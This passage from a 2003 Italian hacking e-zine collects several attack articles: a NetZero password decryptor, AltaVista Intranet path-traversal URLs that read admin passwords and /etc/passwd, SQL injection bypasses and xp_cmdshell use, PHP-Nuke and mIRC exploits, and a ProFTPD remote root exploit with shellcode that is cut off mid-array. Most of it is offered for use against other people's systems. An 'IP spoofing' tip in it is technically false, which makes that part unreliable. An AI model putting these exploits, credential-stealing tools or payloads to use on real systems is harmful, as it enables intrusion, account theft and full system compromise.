"\x00\x00\x00\x00\x00\x00\x00\x00\x43\x01\x00\x00\x14\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x57\x01\x00\x00\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00";

strcpy(filename, "aa");
memset(exploitBuf,0,777);
memcpy(exploitBuf, haggis_magic_buffer, 776);
exploitBufLen=776;
if((controlSock=connect_to_server(ftpPort))==FAILURE) {
printf("\nCould not connect to target server\n");
exit(1);
}
login_to_server();
my_send(controlSock, "MKD incoming\r\n");
my_recv(controlSock);
my_send(controlSock, "SITE CHMOD 777 incoming\r\n");
my_recv(controlSock);
my_send(controlSock, "CWD incoming\r\n");
my_recv(controlSock);
set_passive_mode(UPLOAD);
upload_file();
my_send(controlSock, "SITE CHMOD 777 aa\r\n");
close(controlSock);
}

// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.
void my_sleep(int n) {
struct timespec t;

t.tv_sec=0;
t.tv_nsec=n;
nanosleep(&t,&t);
}
 
--------------------------------------------------------------------------------

hihihi qui finisce l'articolo non c'è più niente qui sotto!! ciao raga, sono  le 
21:00 ci ho messo 30 minuti +o- qualcosa in più qualcosa  in  meno  ma  comunque 
stiamo la! Spero che questo sia servito a qualcosa o se non è servito  a  niente 
almeno ho person un pò di tempo!!! Colgo l'occasione per mandare  a  quel  paese  
il mio caro amico Unrelated! Che bastardo che sei! La mia ragazza è solo mia ok?
Ora ci mettiamo un punto ... ciao a tutti 

Nick    : Cyberdude
Website : http://www.informazionelibera.cjb.net ~ http://www.area91.da.ru 
Mailto  : cyberdudemail@libero.it ~ cyberdudeIL@libero.it 

... in continuo progresso!! hahahaah 
 

+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Netzero e il suo jnetz.prop                                         |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Eccoci di nuovo qui,un altro articolo di hacking, ancora Cyberdude… oggi voglio 
parlarvi di un qualcosa che penso, alcuni di  voi  conosceranno,  altri  di voi 
invece non ne hanno mai sentito parlare, ma  non  ci  perdiamo  in  chiacchiere 
inutili,e passiamo subito all'articolo in se per se vi presento subito Netzero. 
Di cosa si tratta? E' un sistema di  manutenzione  come  ne  troviamo  tanti in 
Internet …Netzero chiede ai suoi utenti di eseguire l'applicazione ZeroPort per 
registrarsi sulla rete. Quando avviene la registrazione Nome utente  e Password 
vengono registrati nel file id.dat. Ora voi direte dov'è il punto? Eccolo qui : 
il sistema di crittografia è  molto ma  molto  scadente,  inoltre  se l'opzione 
"salvo password" è abilitata possiamo  ritrovare  tali  dati  anche in  un file 
chiamato jnetz.prop. Chiaro fino a questo punto?  Adesso  se un  normale utente 
riesce  a  mettere  le  mani  su  tali   file  sarà molto  semplice riuscire  a 
decodificare il  file  jnetz.prop  grazie  ad  un  sistema  di  sostituzione ed 
impossessarsi di nome utente e password. Il codice  di  sostituzione classico è 
una corrispondenza 1a1 tra caratteri dove ogni carattere plaintext è sostituito 
da un carattere ciphertext. Il codice di sostituzione NetZero sostituisce  ogni 
carattere plaintext con due caratteri ciphertext, ma i due caratteri ciphertext 
non sono conservati insieme.Quando sostituisce il carattere P_i di una password 
della lunghezza 'n', il primo carattere ciphertext è C_i e il secondo carattere 
è C_n+i… vabbè voi ora direte ma cyberdude che  cavolo mi  sta dicendo? a me le 
statistiche  matematiche  non  piacciono  e   non  seguo il  discorso ! non  vi 
preoccupate questa parte dell'articolo serve solo a chi vuole capirci un po' di 
più… la cosa importante è che riusciate a prendere  il file  jnetz.prop (vedete 
voi come come fare) poi con il sorgente che  vi  allego  di  seguito  vi create 
l'eseguibile .exe con il compilatore C e vi ricavate  nome  utente e  password. 
Chiaro? Semplice vero? Ed ora eccovi il sorgente … se serve  una  mano chiedete 
pure sul forum di www.informazionelibera.cjb.net ok? 

----------------------------------------[SORGENTE DEL FILE NETZERO.C]----------
#include <stdio.h>
#include <string.h>

#define UID_SIZE	64
#define PASS_CIPHER_SIZE	128
#define PASS_PLAIN_SIZE	64
#define BUF_SIZE 256

const char decTable[6][16] = {
  {'`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o'},
  {'p','q','r','s','t','u','v','w','x','y','z','{','|','}','~',0},
  {'@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O'},
  {'P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_'},
  {'0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?'},
  {' ','!','"','#','$','%','&','\'','(',')','*','+',',','-','.','/'}
};

int nz_decrypt(char cCipherPass[PASS_CIPHER_SIZE], 
  char cPlainPass[PASS_PLAIN_SIZE])
{
	int passLen, i, idx1, idx2;
	passLen = strlen(cCipherPass)/2;
	
	if (passLen > PASS_PLAIN_SIZE)
	{
		printf("Error: Plain text array too small\n");
		return 1;
	}

	for (i = 0; i < passLen; i++)
	{
		switch(cCipherPass[i])
		{
		case '1':
			idx2 = 0; break;
		case 'a':
			idx2 = 1; break;
		case 'M':
			idx2 = 2; break;
		case 'Q':
			idx2 = 3; break;
		case 'f':
			idx2 = 4; break;
		case '7':
			idx2 = 5; break;
		case 'g':
			idx2 = 6; break;
		case 'T':
			idx2 = 7; break;
		case '9':
			idx2 = 8; break;
		case '4':
			idx2 = 9; break;
		case 'L':
			idx2 = 10; break;
		case 'W':
			idx2 = 11; break;
		case 'e':
			idx2 = 12; break;
		case '6':
			idx2 = 13; break;
		case 'y':
			idx2 = 14; break;
		case 'C':
			idx2 = 15; break;
		default:
			printf("Error: Unknown Cipher Text index: %c\n", 
cCipherPass[i]);
			return 1;
			break;
		}

		switch(cCipherPass[i+passLen])
		{
		case 'g':
			idx1 = 0; break;
		case 'T':
			idx1 = 1; break;
		case 'f':
			idx1 = 2; break;
		case '7':
			idx1 = 3; break;
		case 'Q':
			idx1 = 4; break;
		case 'M':
			idx1 = 5; break;
		default:
			printf("Error: Unknown Cipher Text Set: %c\n", 
			  cCipherPass[i+passLen]);
			return 1;
			break;
		}

		cPlainPass[i] = decTable[idx1][idx2];
	}
	cPlainPass[i] = 0;

	return 0;
}

int main(void)
{
	FILE *hParams;
	char cBuffer[BUF_SIZE], cUID[UID_SIZE];
	char cCipherPass[PASS_CIPHER_SIZE], cPlainPass[PASS_PLAIN_SIZE];
	int done = 2;

	printf("\nNet Zero Password Decryptor\n");
	printf("testato da cyberdude [cyberdudeIL@libero.it]\n");
	printf("Informazionelibera founder \n");
	printf("http://www.informazionelibera.cjb.net\n\n");

	if ((hParams = fopen("jnetz.prop","r")) == NULL)
	{
		printf("Unable to find jnetz.prop file\n");
		return 1;
	}	

	while ((fgets(cBuffer, BUF_SIZE, hParams) != NULL) && (done > 0))
	{
		if (strncmp(cBuffer, "ProfUID=", 8) == 0)
		{
			done--;
			strncpy(cUID, cBuffer + 8, UID_SIZE);
			printf("UserID: %s", cUID);
		}

		if (strncmp(cBuffer, "ProfPWD=", 8) == 0)
		{
			done--;
			strncpy(cCipherPass, cBuffer + 8, PASS_CIPHER_SIZE);
			printf("Encrypted Password: %s", cCipherPass);

			if (nz_decrypt(cCipherPass, cPlainPass) != 0)
				return 1;
			else
			printf("Plain Text Password: %s\n", cPlainPass);
		}

	}

	fclose(hParams);

	if (done > 0)
	{
		printf("Invalid jnetz.prop file\n");
		return 1;
	} else {
		return 0;
	}
}


-------------------------------------------------------[FINE SORGENTE]---------

Questo è tutto ciao a tutti … 

CYBERDUDE 
Website : www.informazionelibera.cjb.net 
Mailto  : cyberdudeIL@libero.it 


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Altavista e le reti aziendali                                       |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Ciao miei cari  lettori,  oggi scrivo  solo per una  certa elite,  una casta di 
persone diverse dalle altre… non vi  offendete, non  sono  razzista  o cose del 
genere, ne scrivo solo per gente preparata in informatica, il punto sta che per 
sfruttare questo articolo al meglio delle sue potenzialità, il lettore dovrebbe 
avere a sua disposizione una rete aziendale,  non una rete  aziendale qualunque, 
una rete aziendale con uno di questi due motori di  ricerca :  AltaVista Search 
Intranet 2.0 b e AltaVista Search Intranet 2.3 A chiaro? Si proprio così perché 
questi due motori di ricerca sono facilmente vulnerabili e  possiamo  con poche 
stringhe di testo impossessarci del motore e comandare la nave ;) …prima vorrei 
spiegarvi come funziona e poi vi do le stringhe ok? Allora ragazzi il motore di 
ricerca Altavista si mette in ascolto sulla porta 9000 (cosa che penso sappiano 
in molti) e attende che noi gli  diamo  l'imput per la ricerca.  La funzione di 
ricerca accetterà una singola  stringa di  questo  genere -> "/" per proseguire 
nella ricerca in tutto il campo http. Ma se noi gli  diamo  la  stringa come un 
valore esadecimale (del tipo %2e%2e%2f ) allora ne verranno accettati multipli. 
Qui  viene  il  bello,  tra  i  documenti  ricercati  ce ne  sono alcuni  molto 
interessanti perché contengono la password per  l'amministrazione  del sistema… 
chiaro? Tale password codificata in Base64 è facilmente recuperabile con un po' 
di   stringhe  di  codice …   e  adesso  passiamo  alle   stringhe  di  codice. 

Dunque se provate a digitare : 
http://target:9000/cgi-bin/query?mss=../logs/mgtstate 
otterrete il file mgtstate dove è contenuta la password che ci interessa 

Adesso con questo piccolo codice :
#!/usr/bin/perl 
use MIME::Base64; 
print decode_base64("$ARGV[0]"), "\n";
andiamo a convertire la password da Base64 a plaintext che sarebbe il sistema 
di codifica che conosciamo. 

Fatto ciò ci basterà digitare :
http://target:9000/cgi-bin/mgt
e immettere nome utente o password ricavati dal codice prima inserito per avere 
il completo controllo sul sistema.

Inoltre sul sistema Unix possiamo ottenere direttamente la password grazie a 
questa piccola stringa : 
http://target:9000/cgi-
bin/query?mss=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd

Detto questo ci metto un punto e vi saluto … ciao ragazzi alla prossima 

Cyberdude 
WebSite : http://www.informazionelibera.cjb.net 
Mailto  : cyberdudeIL@libero.it  


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Occorrono ripari al nuovo OPERATO Bill Gates                        |
|  Autore: Cyberdude                                                           |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+

Buon giorno ragazzi … Sabato 18 ottobre 2003, tra due giorni esce la prossima e-
zine, io non ho proprio un bel niente da fare e allora scrivo qualche cosa! Oggi
non  sono andato a scuola perché ieri sera sono andato a una festa di 18 anni  e
son tornato all’1:30 quindi alzatomi di buonora (11:30) ho fatto festa a scuola!
Dunque  stamattina stessa, navigando in un forum il quale nome non riporterò  ho
notato discussioni interessanti quali quella che sto per riportare

-------------------------------------------[DISCUSSIONE]------------------------

Oggi  ho  scaricato la nuova versione di Opera. A prima vista mi sembra  abbiano
fatto passi da gigante. Ad esempio adesso riesco a:

-  accedere  all'home  banking  del  Credito  Cooperativo  (prima  dovevo  usare
   Navigator 4.7 o andare sotto winzozzo);
-  mandare SMS dal sito dell'Omnitel;
-  visualizzare siti ottimizzati per Explorer in maniera + decente  (ancora  non
   sempre in modo perfetto);
-  gli effetti Javascript strani mi sembra vadano molto meglio (anche le cose di
   sopra dipendono fortemente da un migliore supporto JS).

Inoltre  mi  sembra  che il rendering sia ancora più veloce che  nelle  versioni
precedenti  (e non è poco). Rimane da vedere l'aspetto sicurezza  (fino  a  poco
tempo fa qualche problemino  l'aveva), comunque è da provare.
-------------------------------------------[END DISCUSSIONE]--------------------


Alla  quale discussione veniva riportata la risposta del vecchio volpone di Bill
Gates che dice: : "No! Nel nostro software non ci sono bug significativi che  un
numero significativo di utenti vuol vedere corretti."

(Apro questa piccola parentesi per spiegare che Opera è un browser proprio  come
internet Explorer e tanti altri per la navigazione in internet… ok???)

A  questo  punto  io  mi son chiesto … davvero sto nuovo prodotto  dello  zio  è
invulnerabile?  Hhheheheh  secondo voi?? Vi do un consiglio  ragazzi,  se  avete
istallato sul vostro PC Opera 7.10 di dimensioni 12000 ~ 3000 kb che su uno  dei
siti  più  conosciuti in rete per software viene valutato così  :  Valutato  dal
webmaster 9 /10 …  provvedete subito a toglierlo di mezzo! Perché in questo caso
il  webmaster non ha capito bene le “potenzialità” del prodotto!!! Volete sapere
cosa basta fare per mandare in crisi Opera7.10??? Ve lo dico subito io!

news:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Ecco,  questo  è  quanto basta!! hahahahaha ma che ridicolaggine,  una  news  di
lunghezza  eccessiva innesca sul browser una condizione che rende inutilizzabile
il  software fino alla sua prossima reinstallazione!! Congraturazioni Zio  Bill…
ancora una volta un prodotto a prova di bug!

Ora vado a vedere che dice il mondo hihihi ... ciao a  tutti  ;)  -->  CYBERDUDE 

Nick    : Cyberdude
WebSite : http://www.informazionelibera.cjb.net 
Mailto  : cyberdudemail@libero.it ~ cyberdudeIL@libero.it 


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Nascondiamo il nostro indirizzo ip                                  |
|  Autore: Eimiar                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
 +----------------------------------------------------------------------------+
 |P.S. pre scrittum                                                           |
 |KoRnuto cambia nick, d'ora in poi sarà Eimiar                               |
 |                                                                            |
 | KORNUTO - 7H3 N4M3 WR073 0N 7H3 5M0K3                                      |
 | ...PrEsEnTs...                                                             |
 |                                                                            |
 +=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
 |$$$$$$$$$$$$$$$$$$$$$$$$$$  IP SPOOFING SU WINDOWS $$$$$$$$$$$$$$$$$$$$$$$$$|
 +=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-+
 |                                                                            |
 |Per parlare dell'IP spofing, vi devo dire che cos'è l'IP...                 |
 |per dirvi che cos'è l'IP devo dirvi cos'è un computer... (ma baff...)       |
 |per dirvi cos'è un computer... (BASTA!!!!)                                  |
 |                                                                            |
 |Quando gli Americani crearono INTERNET (ALEEEEE!!!) per comunicare con la   |
 |Russia a tempo record, ebbero la necessità di dare una "carta d'identità" a |
 |tutti i computers... questa carta d'identità, formata da delle cifre XAMPLE |
 |123.45.67.89 (è un'IP) serviva per riconoscere un computer, ma, dato che    |
 |stiamo parlando di computers, allora ci dev'essere un modo per mascherare   |
 |questo IP (nella realtà si potrebbe comprare dal marocchino di fiducia dei  |
 |documenti falsi :D ) ma, dato che per riconoscere dei computers, c'è solo   |
 |quello (e non ci sono foto, data di nascita, codice fiscale ECC.) allora gli|
 |Hackers, hanno trovato il modo di mascherare questa brutta bastarda di carta|
 |d'identità che non permetteva all'hacker di svolgere il suo MESTIERE...     |
 |L'IP dunque è un numero a 32 bit di 8 bit ogni quarto di IP (123.45.67.89)  |
 |                                                                            |
 |oggi vi parlerò di questa tecnica...                                        |
 |                                                                            |
 |mettiamo che per conservare la nostra anonimità,non vogliamo dare in giro   |
 |a nessuno il nostro vero IP, allora dobbiamo metterci a spoofarlo, mettiamo |
 |che il nostro IP sia 123.45.67.89 e vogliamo farlo diventare 124.53.87.64   |
 |allora:                                                                     |
 |prima di connetterci apriamo il pannello di controllo, selezioniamo RETE e  |
 |sbizzarriamoci!                                                             |
 |                                                                            |
 |Ora possiamo connetterci, ma prima di andare in giro per la rete, apriamo il|
 |Dos e mettiamo la seguente riga per configurare l'instradamento (perché     |
 |altrimenti, il vero proprietario dell'IP riceverebbe le info al posto vostro|
 |e non credo che sia questo che vorrete :D )                                 |
 |                                                                            |
 |                   tracert -j 15.15.15.5 15.16.16.4 ;                       |
 |                                                                            |
 |buon divertimento!                                                          |
 |                                                                            |
 |Bien, this is all punks                                                     |
 |                                                                            |
 |Byezz                                                                       |
 |                                                                            |
 |KoRnuto (o meglio Eimiar)                                                   |
 +----------------------------------------------------------------------------+

+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Sql Injection                                                       |
|  Autore: Nemesis                                                             |
|  Lingua: Inglese                                                             |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
[ SQL INJECTION ]



{ Legal notes }

The  BlackAngels staff refuse all responsabilities for an incorrect  or  illegal
use  of  the  informations supplied with this paper or for eventual  damages  to
others  systems. This paper has been wrote in the respect of the  Article  21  (
Italian Constitution ).


{ Introduction }

This   paper   will  introduce  the  reader  to  one  of  the   most   dangerous
vulnerabilities  of  web-related applications :  the  SQL  Injection.  Some  PHP
scripts are used to describe the vulnerability, but aren't required  PHP and SQL
knowledges to understand it.


{ General knowledges }

The  SQL Injection is an exploiting technique of web applications that use  data
sent  from  a  client  to  a  Database SQL ( DS ),  without  checking  dangerous
characters. Infact a lot of web applications use particular variables,  that  an
user can change  to comunicate with the DS; unfortunately a malicius user, could
change  that  variables to execute arbitrary code on the remote computer  or  to
bypass a password protected area, for example.


{ Scripts testing } - [ Part one ]

The  SQL Injection's vulnerability, could be really difficult, but in a  lot  of
cases  the  search of the bug in the application's code, could  be  simple;  for
example,  if  you add an apex ( ' ) into a form and the server's response  is  a
white errors page, probably the script is bugged. The best way, is that to check
all variables of the script, with all probably dangerous characters; now we will
analize an example of vulnerable script ( the example script is the code used in
Blangels.it Search Engine, but it isn't really bugged ) :

http://www.blangels.it/Exploit/search.php?s=splatt&a=0

This  url, pass to the script ( search.php ), two correct parameters (  s=splatt
and a=0, where splatt is the word that the script is searching for ); the script
works correctly. Now, try to change the parameter passed to the variable s, with
an apex, before the searched word :

http://www.blangels.it/Exploit/search.php?s='splatt&a=0

If  the  script is vulnerable ( for example in this case ), we have changed  the
parameter  passed from the form to the DS, by inserting an SQL  operator  (  the
apex  ), before it; so the possible error's responses, could be several. Infact,
we could have a white page full of errors, like this :

There  appears  to be an error with the BlackAngels Search Engine database.  You
can  try  to refresh the page by clicking here, if this does not fix the  error,
you  can contact the administrator by clicking here.

Error Returned

mySQL query error: SELECT s, a
mySQL error: Unknown column 's' in 'search list'
mySQL error code: 1054
Date: Wednesday 17th of February 2003 08:40:54 PM

We apologise for any inconvenience

This  is  only an example of error's response.In some cases, the error  will  be
generated  directly  from  the  DS;  then  there  is  surely,  a  SQL  Injection
vulnerability. When you found a bugged script, the best thing to do, is download
the page's html code and the script's code, to search for a programming error or
an unchecked variable.


{ SELECT parameter } - [ Part two ]

A  lot  of web applications, use the parameter SELECT; this command is  used  to
take  a data from a query and to compare it with a database's list. For example,
the  following code, is a login script, that take the username and the  password
from  the query and it compare them with a list ( the script has been took  from
freephp.html.it ):

$login = $_GET["nlogin"];
$password = $_GET["ppass"];
$string = mysql_query("SELECT * FROM ulist WHERE login='".$login."' AND
password='".$password."'");
if (mysql_num_rows($string) == 0)
$in = 0;
else
$in = 1;

This  is  the classical example of a script, vulnerable to dangerous characters,
because  there  aren't any check's conditions; then, to bypass  the  script,  we
could  input in the username ( $login ) and in the password ( $password ) camps,
the code " OR "=" :

$string = mysql_query("SELECT * FROM ulist WHERE login=" OR "=" AND
password=" OR "="");

As you can see, this two conditions are always true, then the script will return
a value equal to 1 ( $in = 1 ).


{ INSERT parameter } - [ Part three ]

Another really vulnerable parameter, with the SELECT too, is the INSERT;  it  is
used  to  insert new records in a table. For example, a malicius user could  use
this parameter, to add an username and a password to a database's list; this  is
possible only if the DS support a particular feature, the SUBSELECT ( Oracle and
MS  SQL  support  this  feature ). Now we can take into consideration  a  simple
script, that add an username and a password into a database's table ( also  this
code has been took from freephp.html.it ):
INSERT INTO loginlist (username,password) VALUES ('admin','guest');

This  is the correct code, that insert into the table ( loginlist ), an username
ad  a  password ( admin and guest ). But if we change "admin" with  "  +  SELECT
username  FROM  loginlist LIMIT 1 + " and guest with " +  SELECT  password  FROM
loginlist LIMIT 1 + ", the script's code will become :

INSERT  INTO  loginlist  (username,password) VALUES (' +  SELECT  username  FROM
loginlist LIMIT 1 + ' ,' + SELECT password FROM loginlist LIMIT 1 + ');

Now the query will replicate into the table, an existent record.


{ STORED PROCEDURES feature } - [ Part four ]

The  STORED PROCEDURES are a feature, that is supported from a lot of  DS,  like
Oracle  and MS SQL; STORED PROCEDURES are particular batch files, recalled  with
the  EXEC   parameter,  that execute operations, directly  on  the  DS.  Perhaps
xp_cmdshell,  is the most vulnerable STORED PROCEDURE of the MS SQL  Server.  It
could  be  used from a malicius user, to execute arbitrary code on  the  server;
infact,  you  could use a simple code like this, to see the list of  all  files,
into the server's hard drive :

EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:\'

This  vulnerability is comparable with the IIS Unicode bug. So, when this STORED
PROCEDURE  is active, you could execute any kind of DOS command, on  the  remote
server.

With  this simple example, i close this paper. For more informations send  me  a
message to : nemesis@blangels.it
Thank you for reading this paper.



+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: mIRC USERHOST Buffer Overflow                                       |
|  Autore: Branton                                                             |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
mIRC USERHOST Buffer Overflow
==============================


Esiste una vulnerabilità nel più popolare IRC client per windows che permette  a
server  IRC  di causare l'esecuzione di codici arbitrari nel IRC client  tramite
overflowing e buffer interno.

Sistemi vulnerabili:
- mIRC version 6.01 thru 6.1

Quando  viene richiesta l'informazione "Utente" (User) mIRC presume  che  l'host
sia  minore  di  110bytes. Se la stringa di risposta dell'host è  più  lunga  di
110bytes causerà l'overflow in mIRC.

Quando ci connettiamo al server, esso ci senda la richiesta USERHOST e ci chiede
l'informazione local host:

<- :server.com 001 Victim :Welcome
-> :server.com USERHOST Victim
----- And then , the server's reply -----
<- :server.com 302 Victim:Victim=+~b@cnqXX-XXX.cablevision.qc.ca
Local host: cnqXX-XXX.cablevision.qc.ca (24.212.XX.XXX)


Come  possiamo  notare  sendando una risposta  di  più  di  110  bytes,  accadrà
l'overflow:
:server.com 302 Victim:Victim=+~b@

Per  sfruttare al meglio l'exploit l'attaccante, però, avrà bisogno di  fare  il
seguente:

-  Trovare la vittima che si connetta al suo server mIRC ( in questo caso ci può
tornare   utile il socialengineer )

-  Trovare la versione di mIRC della vittima ( in questo caso basta sendare  una
richiesta   ctcp version )


Abbiamo  detto  che  la vulnerabilità permette di sendare codici  arbitrari  che
verranno  eseguiti  sulla  macchina  della vittima  (  costringendo  l'utente  a
connettersi al server ) usando l'indirizzo API dal mIRC.exe. Non c'è bisogno  di
sapere  l'esatto  sistema operativo che gira sulla macchina  della  vittima  per
avere successo nell'exploit e di conseguenza nell'overflow.


Exploit:

L'exploit programmato con VisualBasic lo possiamo trovare al seguente indirizzo:
http://whiteroof.netfirms.com/userhost.zip oppure nel nostro sito: www.uiha.tk

L'exploit  in  questione  tenterà di eseguire un comando  a  vostra  scelta,  di
default è impostato calc.exe e mIRC andrà in crash.


::[Branton]::

    ___  ___ ___ ___  ____       
    | |  | | | || |  | | \       
    | |  | | | || |__| |  \      
    | |__| | | ||  __  | @ \     
     \____/  |_||_|  |_|_|\_\    
                                 

::[ Research & Development ]::
::[ Stage2 @ 2003 ]::
::[ www.uiha.tk ]::


+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: Esecuzione di comandi nel PHP-Nuke WebMail                          |
|  Autore: Marsio                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
Esecuzione di comandi nel PHP-Nuke WebMail (Mailattach)


Credo  che  ormai tutti noi sappiamo cosa sia il Php-Nuke comunque rispiegandolo
non  credo  che faccia male a nessuno: Il PHP-Nuke non è altro che un  programma
open-source per creare e amministrare siti web.


PHP-Nuke  sfortunatamente  permette  ad utenti  remoti  di  includere  file  non
autorizzati all'interno del codice PHP attraverso una vulnerabilità  nel  modulo
WebMail e tutti gli altri moduli che permettono di upluodare files.

Sistemi Vulnerabili:

PHP-Nuke version 6.0
PHP-Nuke version6.5


Un  utente  remoto ha la possibilità di sendare una speciale stringa  attraverso
una   richiesta  http  allo  script  mailattach.php  specificando  il  file  non
autorizzato  da  sendare,  questo  permette ad  un  utente  di  eseguire  codici
all'interno del web server e avendo anche la possibilità di ottenere il database
contenenti user e password.


Il codice vulnerabile in questione è il seguente:

From mailattach.php file:
if (isset($userfile) AND $userfile != "none") {
    if (ini_get(file_uploads) AND $attachments == 1) {
  $updir = "tmp";
  @copy($userfile, "$updir/$userfile_name");


Exploit:

Per  exploitare  questa vulnerabilità non basta altro che inserire  la  seguente
stringa             in             un             qualsiasi             broswer:
http://target.server/modules/WebMail/mailattach.php?userfile=../../config.php&us
erfile_name=../attachments/file.txt&attachments=1





         ::[ MARSIO ]::

    ___  ___ ___ ___  ____       
    | |  | | | || |  | | \       
    | |  | | | || |__| |  \      
    | |__| | | ||  __  | @ \     
     \____/  |_||_|  |_|_|\_\    
                                 

::[ Research & Development ]::
::[ Stage2 @ 2003 ]::
::[ www.uiha.tk ]::



+--[HACKING]-------------------------------------------------------------[IL04]+
|  Titolo: ProFTPD ASCII File Remote Compromise Vulnerability                  |
|  Autore: Marsio                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
ProFTPD ASCII File Remote Compromise Vulnerability

ISS  X-Force hanno scoperto un difetto nel server ProFTPD per sistemi Unix. Come
sapete  ProFTPD  è un server estremamente configurabile che permette  attraverso
restrizioni  di  accesso una semplice configurazione del  server  FTP  virtuale,
inoltre supporta un meccanismo di multiple autenticazioni. Il difetto esiste nei
componenti di ProFTPD che si occupano di trasferimento dei file.


Sistemi Vulnerabili:

ProFTPD version 1.2.7
ProFTPD version 1.2.8
ProFTPD version 1.2.8rc1
ProFTPD version 1.2.8rc2
ProFTPD version 1.2.9rc1
ProFTPD version 1.2.9rc2


N.B. => possono esserci versioni vulnerabili anche prima della versione 1.2.7


La  vulnerabilità può essere provocata da un utente remoto quando viene eseguito
il  trasferimento  di file dall'FTP in modalità ASCII mode. L'utente  remoto  in
questo caso deve avere la possibilità di upluodare file all'interno del server e
attendere il download per provocare la vulnerabilità.

Ma come avviene la vulnerabilità ?

La  vulnerabiltà avviene quando un file viene trasferito in ASCII mode,  durante
il  trasferimento  il file è esaminato in 1024 byte per controllare  il  comando
newline (\n).  La traduzione di questi caratteri non è maneggiata corettamente e
un  buffer overflow potrebbe manifestarsi in ProFTPD. In caso avenisse il buffer
overflow, il demone ProFTPD, lascia cadere i privilegi superusers per limitare i
privilegi  all'utente  remoto. X-Force ha dimostrato che  questa  sicurezza  può
essere bypassata, e un accesso superuser potrebbe essere guadagnato da un utente
remoto.


Impatto:

Un  utente  remoto  capace  di upluodare file nel sistema  vulnerabile  potrebbe
avviare  un  buffer  overflow  ed  eseguire codici  arbitrari  per  prendere  il
controllo  completo del sistema. Con il mondo d'oggi, questi utenti  remoti  con
questa  vulnerabilità  potrebbero distruggere,  nascondere,  o  manipulare  dati
all'interno del FTP vulnerabile.


Se  l'utente  remoto,  però,  non può upluodare  nessun  file  non  è  possibile
exploitare la vulnerabilità. Consiglierei di (dove è possibile) disabilitare  la
possibilità  che permette ad utenti remoti di upluodare nell'FTP,  con  permessi
sui file oppure usando il parametro di configuarazione che riporto di seguito:

<Limit WRITE>
     DenyAll
</Limit>


Possiamo diminuire il rischio inoltre usando una opzione che permette ai root di
essere lasciati cadere contemporaneamente:

RootRevoke on


Al momento non esiste ancora una patch ufficiale per questa vulnerabilità.


Posto di seguito l'exploit per testare la vulnerabilità del proprio server:


Exploit:
/* proftpd 1.2.7/1.2.9rc2 remote root exploit by bkbll (bkbll#cnhonker.net,
2003/10/1)*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 21
#define SIZE 1024
#define BIGSIZE 1024*42
#define OFFSET 39 //cbshellcode ip & port offset,0 is the first
#define OFF2 70 //bindshellcode port offset,0 is the first
#define VER "1.20"

char cbshellcode[]= //from www.netric.org,and modified some code by myself
"\x31\xc0\x31\xdb\x31\xc9\xb0\x17"
"\xcd\x80\x31\xc0\x51\xb1\x06\x51"
"\xb1\x01\x51\xb1\x02\x51\x89\xe1"
"\xb3\x01\xb0\x66\xcd\x80\x89\xc2"
"\x31\xc0\x31\xc9\x51\x51\x68\x41"
"\x42\x43\x44\x66\x68\xb0\xef\xb1"
"\x02\x66\x51\x90\x89\xe7\xb3\x10"
"\x53\x57\x52\x89\xe1\xb3\x03\xb0"
"\x66\xcd\x80\x31\xc9\x39\xc1\x74"
"\x06\x31\xc0\xb0\x01\xcd\x80\x31"
"\xc0\xb0\x3f\x89\xd3\xcd\x80\x31"
"\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd"
"\x80\x31\xc0\xb0\x3f\x89\xd3\xb1"
"\x02\xcd\x80\x31\xc9\x51\x68\x6e"
"\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x51\x68\x2d\x69\x69\x70"
"\x89\xe2\x51\x52\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80\x31"
"\xc0\xb0\x01\xcd\x80";
char bindshellcode[]= //from www.netric.org,and modified some code by myself
"\x90\x90\x90\x31\xc0\x31\xdb\x31"
"\xc9\xb0\x17\xcd\x80\x31\xc0\xb0"
